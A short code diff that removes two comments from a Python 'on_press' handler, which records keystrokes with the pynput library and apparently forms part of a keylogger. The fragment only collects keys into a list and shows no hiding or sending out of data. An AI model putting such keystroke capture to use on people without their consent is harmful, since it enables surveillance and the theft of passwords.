@@ -1,9 +1,7 @@
 def on_press(self, key):
     try:
-        # Normal characters (a, b, c, 1, 2, 3, etc.)
         self.keys.append(key.char)
     except AttributeError:
-        # Special keys
         if key == pynput_keyboard.Key.space:
             self.keys.append('[SPACE]')
         elif key == pynput_keyboard.Key.enter:
